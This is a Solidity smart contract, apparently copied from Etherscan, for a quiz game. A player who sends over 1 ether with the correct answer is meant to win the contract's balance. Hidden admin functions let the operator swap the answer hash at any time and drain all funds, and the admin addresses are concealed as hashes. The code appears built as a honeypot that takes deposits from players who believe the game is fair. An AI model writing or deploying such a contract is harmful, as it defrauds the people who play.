pragma solidity 0.4.25;

/**
 *Submitted for verification at Etherscan.io on 2020-12-26
*/

contract US_Game
{
    //The Try function requires an input of type string, and requires the sender's massage value greater than 1 eth
    function Try(string _response) external payable 
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    bytes32 public responseHash;

    mapping (bytes32=>bool) admin;
    
    
    //This is a one-time function that requires two inputs, 
    //if the current respensehash is 0 which means no Q/A has been set yet, 
    //then this input will be used as the question and answer
    function Start(string _question, string _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    //This function is available only to the admin and will transfer all the balance of the contract to the caller - the game's admin
    function Stop() public payable isAdmin {
        msg.sender.transfer(this.balance);
    }

    //Allow admin change Q/A
    function New(string _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    //The constructor function requires that the address be set to admin by entering a list of byte32 at the time of contract deployment
    constructor(bytes32[] admins) public{
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;        
        }       
    }

    //Check if the message sender is admin, if not it will cause revert
    modifier isAdmin(){
        require(admin[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}
